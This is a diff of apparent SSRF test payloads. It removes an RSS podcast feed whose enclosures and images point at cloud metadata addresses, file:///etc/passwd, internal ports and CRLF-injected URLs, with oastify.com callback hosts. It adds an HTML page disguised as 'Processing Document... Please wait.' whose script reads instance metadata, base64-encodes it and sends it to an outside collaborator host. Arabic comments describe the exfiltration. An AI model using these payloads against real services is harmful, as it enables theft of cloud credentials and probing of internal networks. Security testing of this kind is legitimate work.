@@ -1,37 +1,23 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" 
-     xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" 
-     xmlns:content="http://purl.org/rss/1.0/modules/content/">
-  <channel>
-    <title>Infrastructure Deep Audit vFinal</title>
-    <link>http://413b9nvnai7mmh20lk7id22plgr7f33s.oastify.com/root</link>
-    <language>en-us</language>
-
-    <item>
-      <title>Vector 1: Protocol &amp; Schema Bypasses</title>
-      <enclosure url="gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a" length="1" type="audio/mpeg"/>
-      <enclosure url="file:///etc/passwd" length="1" type="audio/mpeg"/>
-      <itunes:image href="http://oiavq7c7r2o631jk24o2umj9208rwqkf.oastify.com/protocol_hit"/>
-    </item>
-
-    <item>
-      <title>Vector 2: Internal Service &amp; Port Sweep</title>
-      <enclosure url="http://127.0.0.1:6379" length="1" type="audio/mpeg"/> <enclosure url="http://127.0.0.1:11211" length="1" type="audio/mpeg"/> <enclosure url="http://localhost:8080" length="1" type="audio/mpeg"/> <itunes:image href="http://413b9nvnai7mmh20lk7id22plgr7f33s.oastify.com/port_scan_hit"/>
-    </item>
-
-    <item>
-      <title>Vector 3: Squid Proxy CRLF Injection</title>
-      <enclosure url="http://127.0.0.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a/latest/meta-data/" length="1" type="audio/mpeg"/>
-      <content:encoded><![CDATA[
-        <img src="http://oiavq7c7r2o631jk24o2umj9208rwqkf.oastify.com/crlf_tracker">
-      ]]></content:encoded>
-    </item>
-
-    <item>
-      <title>Vector 4: Cloud Instance Metadata (IMDSv1/v2)</title>
-      <enclosure url="http://169.254.169.254/latest/meta-data/iam/info" length="1" type="audio/mpeg"/>
-      <enclosure url="http://instance-data/latest/meta-data/" length="1" type="audio/mpeg"/>
-      <itunes:summary>Probe: http://169.254.169.254/latest/user-data/</itunes:summary>
-    </item>
-  </channel>
-</rss>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Audit Test</title>
+</head>
+<body>
+    <h1>Processing Document... Please wait.</h1>
+    <script>
+        // محاولة سحب الميتا داتا وإرسالها للـ Collaborator
+        fetch('http://169.254.169.254/latest/meta-data/')
+            .then(response => response.text())
+            .then(data => {
+                // تحويل البيانات لـ Base64 وإرسالها في الرابط
+                const encodedData = btoa(data);
+                fetch('http://f9pmhy3yitfxusabtvftlda0trzinmbb.oastify.com/?exfiltrated=' + encodedData);
+            })
+            .catch(err => {
+                // لو فشل، يبعت رسالة خطأ للـ Collaborator عشان نعرف العائق فين
+                fetch('http://f9pmhy3yitfxusabtvftlda0trzinmbb.oastify.com/?error=' + btoa(err.message));
+            });
+    </script>
+</body>
+</html>
